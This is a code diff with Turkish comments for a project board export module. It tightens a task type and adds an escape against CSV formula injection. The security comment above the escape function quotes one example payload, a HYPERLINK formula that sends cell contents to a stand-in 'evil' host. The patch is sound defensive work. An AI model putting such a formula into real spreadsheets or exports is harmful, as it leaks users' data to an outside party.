@@ -38,7 +38,13 @@ export interface BoardShape {
     string,
     { id: string; title: string; wipLimit: number | null; isDone: boolean; taskIds: string[] }
   >;
-  tasks: Record<string, unknown>;
+  // BoardTask olarak yazili: disa aktarma zaten her gorevi BoardTask gibi
+  // okuyor (duzlestir), o yuzden tipi "unknown" tutup her erisimde cast
+  // etmek guvenlik saglamiyordu - sadece cagiranlarin (ve testlerin) alan
+  // adlarini yanlis yazmasini gizliyordu. Cagiran uc (projects/[id]/export)
+  // getBoard ciktisini zaten "as unknown as BoardShape" ile geciriyor,
+  // dolayisiyla bu daraltma orayi bozmuyor.
+  tasks: Record<string, BoardTask>;
 }
 
 /** Kolon sirasi + kart sirasi korunarak duzlestirilmis satirlar. */
@@ -52,7 +58,10 @@ function duzlestir(board: BoardShape): DuzSatir[] {
   const satirlar: DuzSatir[] = [];
   for (const kolon of Object.values(board.columns)) {
     for (const taskId of kolon.taskIds) {
-      const gorev = board.tasks[taskId] as BoardTask | undefined;
+      // taskIds, tasks'ta karsiligi olmayan bir kimlik tasiyabilir (kart
+      // silinmis ama kolon listesi guncellenmemisse), o yuzden undefined
+      // ihtimali aciktan yaziliyor.
+      const gorev: BoardTask | undefined = board.tasks[taskId];
       if (!gorev) continue;
       satirlar.push({ kolon: kolon.title, kolonBitti: kolon.isDone, gorev });
     }
@@ -433,9 +442,27 @@ export async function boardToXlsx(
 
 // --------------------------------------------------------------------- csv
 
+// GUVENLIK: CSV/Formül Enjeksiyonu (CWE-1236). Kart başlığı/açıklaması,
+// atanan/etiket adları TAMAMEN kullanıcı kontrolünde (herhangi bir proje
+// üyesi girebilir) ve burada hiç değiştirilmeden CSV'ye yazılıyordu. Bir
+// hücre "=", "+", "-", "@" (ya da TAB/CR) ile başlıyorsa Excel/Google
+// Sheets/LibreOffice dosyayı AÇARKEN bunu bir FORMÜL sanıp çalıştırır -
+// örn. `=HYPERLINK("http://evil/"&A1,"tıkla")` ile başka hücrelerin
+// içeriğini dışarı sızdırabilir, eski Excel sürümlerinde DDE ile komut
+// çalıştırabilir. XLSX (exceljs) buna açık DEĞİL - hücre tipi (paylaşılan
+// string) XML'de açıkça işaretli, Excel içeriği metin dışı yorumlamıyor;
+// risk sadece tip bilgisi taşımayan düz metin CSV'de var.
+const FORMUL_TETIKLEYICI = /^[=+\-@\t\r]/;
+
 function csvEscape(value: string | number | null | undefined): string {
   if (value === null || value === undefined) return "";
-  const s = String(value);
+  let s = String(value);
+  // OWASP'in onerdigi standart onlem: tetikleyici bir karakterle basliyorsa
+  // basina tek tirnak ekleyip metne zorla - gorunen degeri bozmaz (Excel
+  // tek tirnagi gostermez), sadece formul olarak calistirilmasini engeller.
+  if (FORMUL_TETIKLEYICI.test(s)) {
+    s = `'${s}`;
+  }
   return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
